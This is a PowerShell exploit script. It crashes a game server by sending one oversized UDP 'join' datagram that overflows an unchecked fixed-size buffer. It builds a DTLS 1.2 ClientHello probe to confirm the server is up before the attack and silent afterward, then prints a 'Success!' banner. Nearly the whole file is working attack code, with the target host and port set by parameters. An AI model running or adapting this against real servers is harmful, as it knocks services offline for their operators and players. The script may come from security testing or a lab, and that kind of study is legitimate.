param(
    [string] $Server = "127.0.0.1",
    [int] $Port = 4243,
    [int] $Bytes = 65507
)

# Attack a community game server with ONE oversized UDP "join" datagram.
# The server copies the whole datagram into a fixed 16,765-byte buffer
# without checking the size, so an oversized join overwrites the server's
# memory. No account, no handshake, one packet.
#
# Success is confirmed the way any remote player would confirm it: a DTLS
# server answers a join attempt (ClientHello) with a cookie challenge
# (HelloVerifyRequest). Probe before: server answers. Attack. Probe after:
# a dead server answers nothing.

function Send-Probe {
    # Minimal well-formed DTLS 1.2 ClientHello (no extensions).
    $body = New-Object System.Collections.Generic.List[byte]
    $body.Add(0xFE); $body.Add(0xFD)                              # DTLS 1.2
    $rand = [byte[]]::new(32)
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($rand)
    $body.AddRange($rand)                                         # random
    $body.Add(0)                                                  # session id len
    $body.Add(0)                                                  # cookie len
    $body.Add(0); $body.Add(2); $body.Add(0x00); $body.Add(0x9C)  # one cipher suite
    $body.Add(1); $body.Add(0)                                    # compression: null
    $body.Add(0); $body.Add(0)                                    # extensions len
    $bodyBytes = $body.ToArray()

    $hs = New-Object System.Collections.Generic.List[byte]
    $hs.Add(1)                                                    # ClientHello
    $len = $bodyBytes.Length
    $hs.Add(0); $hs.Add([int][math]::Floor($len / 256)); $hs.Add($len % 256)     # length
    $hs.Add(0); $hs.Add(0)                                        # message seq
    $hs.Add(0); $hs.Add(0); $hs.Add(0)                            # frag offset
    $hs.Add(0); $hs.Add([int][math]::Floor($len / 256)); $hs.Add($len % 256)     # frag length
    $hs.AddRange($bodyBytes)
    $hsBytes = $hs.ToArray()

    $rec = New-Object System.Collections.Generic.List[byte]
    $rec.Add(0x16); $rec.Add(0xFE); $rec.Add(0xFD)                # handshake, DTLS 1.2
    $rec.Add(0); $rec.Add(0)                                      # epoch
    $rec.Add(0); $rec.Add(0); $rec.Add(0); $rec.Add(0); $rec.Add(0); $rec.Add(0) # seq (6 bytes)
    $rlen = $hsBytes.Length
    $rec.Add([int][math]::Floor($rlen / 256)); $rec.Add($rlen % 256)
    $rec.AddRange($hsBytes)

    $udp = [System.Net.Sockets.UdpClient]::new(0)
    $udp.Client.ReceiveTimeout = 1500
    $null = $udp.Send($rec.ToArray(), $rec.Count, $Server, $Port)
    $ep = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
    $answered = $false
    try { $null = $udp.Receive([ref]$ep); $answered = $true } catch {}
    $udp.Dispose()
    return $answered
}

# 1. Baseline: is the server answering joins right now?
if (-not (Send-Probe)) {
    Write-Output "probe: no answer - server already down (nothing to do)"
    return
}
Write-Output "probe: server answered the join handshake - server is up"

# 2. The attack: one oversized join datagram.
$fill = 0x42                                  # filler byte; value is irrelevant
$payload = [byte[]]::new($Bytes)
for ($i = 0; $i -lt $Bytes; $i++) { $payload[$i] = $fill }
$udp = [System.Net.Sockets.UdpClient]::new(0)
$sent = $udp.Send($payload, $payload.Length, $Server, $Port)
$udp.Dispose()
Write-Output ("sent {0}-byte join datagram to {1}:{2}" -f $sent, $Server, $Port)

# 3. Confirm: a healthy server keeps answering joins. A dead one is silent.
Start-Sleep -Milliseconds 500
$confirmed = $true
foreach ($i in 1..5) {
    if (Send-Probe) { $confirmed = $false; break }
    Write-Output "probe: no answer"
    Start-Sleep -Milliseconds 700
}
if ($confirmed) {
    $msg = "Success! server is not answering - it is DOWN"
    $bar = [string]::new('-', $msg.Length + 2)
    Write-Host ""
    Write-Host ("  +" + $bar + "+") -ForegroundColor Green
    Write-Host ("  | " + $msg + " |") -ForegroundColor Green
    Write-Host ("  +" + $bar + "+") -ForegroundColor Green
    Write-Host ""
} else {
    Write-Host "  server is still answering - attack may have failed" -ForegroundColor Yellow
}
